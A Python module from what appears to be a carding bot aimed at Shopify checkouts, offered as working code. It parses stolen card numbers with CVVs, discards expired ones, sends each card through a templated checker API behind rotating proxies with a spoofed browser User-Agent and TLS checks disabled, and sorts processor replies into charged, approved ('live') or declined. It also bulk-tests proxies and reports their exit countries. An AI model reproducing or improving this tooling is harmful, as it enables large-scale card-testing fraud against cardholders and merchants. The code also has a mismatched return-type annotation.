import asyncio
import json
import re
import time
import aiohttp

from config import GATEWAY_TIMEOUTS, PROXY_CHECK_WORKERS, GLOBAL_SESSIONS

TIMEOUT = GATEWAY_TIMEOUTS.get("Shopify", 40)
_PROXY_WORKERS = PROXY_CHECK_WORKERS
_TEST_URLS = [
    "http://httpbin.org/ip",
    "http://ip-api.com/json",
    "https://api.ipify.org?format=json",
]

_session: aiohttp.ClientSession | None = None
_session_lock = asyncio.Lock()


async def _get_session() -> aiohttp.ClientSession:
    global _session
    if _session is not None and not _session.closed:
        return _session
    async with _session_lock:
        if _session is not None and not _session.closed:
            return _session
        if _session is not None:
            try:
                await _session.close()
            except Exception:
                pass
        connector = aiohttp.TCPConnector(
            limit=GLOBAL_SESSIONS,
            limit_per_host=100,
            ssl=False,
            enable_cleanup_closed=True,
            keepalive_timeout=90,
            ttl_dns_cache=600,
            use_dns_cache=True,
            force_close=False,
        )
        _session = aiohttp.ClientSession(
            connector=connector,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
            },
            connector_owner=True,
        )
        return _session


async def close_session():
    global _session
    if _session and not _session.closed:
        await _session.close()
        _session = None


def build_url(template: str, site: str, card: str, proxy: str = "") -> str:
    return (
        template.strip()
        .replace("{site}", site.strip())
        .replace("{card}", card.strip())
        .replace("{cc}", card.strip())
        .replace("{proxy}", proxy.strip())
    )


_CHARGE_EXACT = frozenset({"charge", "1", "ccn live"})
_CHARGE_WORDS = (
    "order_paid", "order_placed", "order_confirmed", "order_completed",
)

_APPROVED_EXACT = frozenset({"approved", "live", "success", "ccn live cvv", "live cvv"})
_APPROVED_WORDS = (
    "insufficient_funds", "insufficient funds",
    "incorrect_zip", "incorrect zip",
    "incorrect_cvc", "incorrect cvc",
    "3ds_authentication", "3ds_required", "3d_required",
    "3d_authentication", "3ds-auth", "3d-secure", "3d secure",
    "3d_redirect", "3ds", "3d",
    "authentication_required", "auth required",
    "otp_required", "otp required", "otp",
    "challenge required", "incorrect_number", "two factor",
)

_DECLINED_EXACT = frozenset({"declined", "dead", "0", "invalid", "failed"})
_DECLINED_WORDS = (
    "generic_decline", "generic decline",
    "do_not_honor", "FRAUD_SUSPECTED",
    "stolen_card", "lost_card", "pickup_card", "restricted_card",
    "fraudulent", "fraud",
    "expired_card", "expired",
    "transaction_not_allowed",
    "card_declined", "card declined",
    "processor_declined",
    "card_not_supported", "currency_not_supported",
    "revocation_of_authorization", "no_action_taken",
    "your card was declined",
    "payment_intent_authentication_failure",
    "Credit card brand is not supported: maestro",
    "|Credit card brand is not supported: alelo", "invalid_number",
    "decision_rule_block", "generic_error",
    "buyer_identity_presentment_currency_does_not_match",
    "delivery_no_delivery_strategy_available",
    "this order is prevented due to suspect of fraud",
    "not_permitted", "This order is prevented due to suspect of fraud. If this is in error please contact us through our contact page. Thank you.",
)


def parse_response(data: dict | None, status_code: int, raw: str) -> tuple[str, str, float, str]:
    """Returns (status, message, price, receipt_url)"""
    if data is None or not isinstance(data, dict):
        return "Error", raw[:80] if raw.strip() else "Empty response", 0.0, ""
    resp = str(
        data.get("Response") or data.get("message") or
        data.get("Message") or data.get("msg") or ""
    ).strip()
    try:
        price = float(data.get("Price") or data.get("price") or 0)
    except (ValueError, TypeError):
        price = 0.0
    # استخراج receipt_url من أي حقل ممكن يرجعه الـ API
    receipt_url = str(
        data.get("receipt_url") or data.get("ReceiptUrl") or
        data.get("receipt_link") or data.get("order_url") or
        data.get("confirmation_url") or data.get("order_status_url") or ""
    ).strip()
    if not resp:
        return "Error", f"HTTP {status_code}", price, receipt_url
    r = resp.lower()
    if r in _CHARGE_EXACT or r.startswith(("charge", "charged ")):
        return "Charge", resp, price, receipt_url
    if any(k in r for k in _CHARGE_WORDS):
        return "Charge", resp, price, receipt_url
    if r in _APPROVED_EXACT or r.startswith(("approved", "approve ")):
        return "Approved", resp, price, receipt_url
    if any(k in r for k in _APPROVED_WORDS):
        return "Approved", resp, price, receipt_url
    if r in _DECLINED_EXACT or r.startswith(("declined", "decline ")):
        return "Declined", resp, price, receipt_url
    if any(k in r for k in _DECLINED_WORDS):
        return "Declined", resp, price, receipt_url
    return "Error", resp, price, receipt_url


async def check_card(
    card: str,
    site: str,
    api_url: str,
    proxy: str = "",
    timeout: int = TIMEOUT,
    session: aiohttp.ClientSession | None = None,
) -> tuple[str, str, bool, float, float]:
    parts = card.strip().split("|")
    if len(parts) < 4:
        return "Error", "Invalid card format", False, 0.0, 0.0
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2:
        yy = f"20{yy}"
    full_card = f"{cc}|{mm}|{yy}|{cvv}"
    url       = build_url(api_url, site, full_card, proxy)
    proxy_url = _build_proxy_url(proxy) if proxy else None
    if session is None:
        session = await _get_session()
    ct    = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 12))
    start = time.time()
    try:
        async with session.get(
            url, proxy=proxy_url, timeout=ct, ssl=False, allow_redirects=True
        ) as resp:
            sc  = resp.status
            raw = await resp.text(errors="replace")
        try:
            data = json.loads(raw)
        except Exception:
            data = None
        elapsed = time.time() - start
        status, msg, price, receipt_url = parse_response(data, sc, raw)
        return status, msg, status in ("Charge", "Approved"), price, elapsed, receipt_url
    except asyncio.TimeoutError:
        return "Error", "Timeout", False, 0.0, time.time() - start, ""
    except Exception as e:
        return "Error", str(e)[:60], False, 0.0, time.time() - start, ""


def _parse_proxy(p: str):
    p = p.strip()
    m = re.match(r'^(https?)://([^:@]+):([^@]+)@([^:]+):(\d{1,5})$', p, re.I)
    if m:
        return m.group(4), m.group(5), m.group(2), m.group(3), m.group(1).lower()
    m = re.match(r'^([^:@\s]+):([^@\s]+)@([a-zA-Z0-9._-]+):(\d{1,5})$', p)
    if m:
        return m.group(3), m.group(4), m.group(1), m.group(2), "http"
    parts = p.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        if re.match(r'^[a-zA-Z0-9._-]+$', host) and port.isdigit() and user and pwd:
            return host, port, user, pwd, "http"
    return None, None, None, None, None


def _build_proxy_url(p: str) -> str | None:
    if not p or not p.strip():
        return None
    p = p.strip()
    if re.match(r'^socks[45]://', p, re.I):
        return None  # aiohttp لا يدعم socks مباشرة
    host, port, user, pwd, proto = _parse_proxy(p)
    if host:
        return f"{proto}://{user}:{pwd}@{host}:{port}" if user else f"{proto}://{host}:{port}"
    return f"http://{p}" if "://" not in p else p


def is_valid_proxy(proxy: str) -> bool:
    host, *_ = _parse_proxy(proxy)
    return host is not None


async def test_proxy(proxy: str, timeout: float = 8.0) -> tuple[bool, float, str]:
    url = _build_proxy_url(proxy)
    if not url:
        return False, 0.0, "Invalid format"
    session = await _get_session()
    for test_url in _TEST_URLS:
        try:
            t0 = time.time()
            async with session.get(
                test_url, proxy=url, timeout=aiohttp.ClientTimeout(total=timeout), ssl=False
            ) as resp:
                if resp.status == 200:
                    try:
                        data    = await resp.json(content_type=None)
                        country = (
                            data.get("country") or
                            data.get("countryCode") or
                            data.get("country_code") or "?"
                        )
                    except Exception:
                        country = "?"
                    ms = (time.time() - t0) * 1000
                    return True, round(ms), country
        except Exception:
            continue
    return False, 0.0, "Dead"


async def test_proxies_bulk(proxies: list[dict]) -> list[tuple]:
    sem = asyncio.Semaphore(_PROXY_WORKERS)

    async def _test_one(p):
        async with sem:
            ok, ms, country = await test_proxy(p["proxy"])
            return (p["id"], p["proxy"], "working" if ok else "dead", ms, country)

    results = await asyncio.gather(*[_test_one(p) for p in proxies], return_exceptions=True)
    return [r for r in results if not isinstance(r, Exception)]


_CARD_RE = re.compile(
    r'\b(\d{13,19})\s*[|:/ ]\s*(\d{1,2})\s*[|:/ ]\s*(\d{2,4})\s*[|:/ ]\s*(\d{3,4})\b'
)


def parse_card(line: str) -> str | None:
    m = _CARD_RE.search(line.strip())
    if not m:
        return None
    cc, mm, yy, cvv = m.group(1), m.group(2), m.group(3), m.group(4)
    if len(yy) == 2:
        yy = f"20{yy}"
    try:
        now = time.localtime()
        if int(yy) * 100 + int(mm) < now.tm_year * 100 + now.tm_mon:
            return None
    except Exception:
        pass
    return f"{cc}|{mm}|{yy}|{cvv}"


def parse_cards(text: str, limit: int = 0) -> list[str]:
    seen, out = set(), []
    for line in text.splitlines():
        if limit and len(out) >= limit:
            break
        c = parse_card(line)
        if c and c not in seen:
            seen.add(c)
            out.append(c)
    return out


def luhn_valid(cc: str) -> bool:
    digits = [int(d) for d in cc if d.isdigit()]
    if len(digits) < 13:
        return False
    total = sum(
        d if i % 2 == 0 else (d * 2 - 9 if d * 2 > 9 else d * 2)
        for i, d in enumerate(reversed(digits))
    )
    return total % 10 == 0
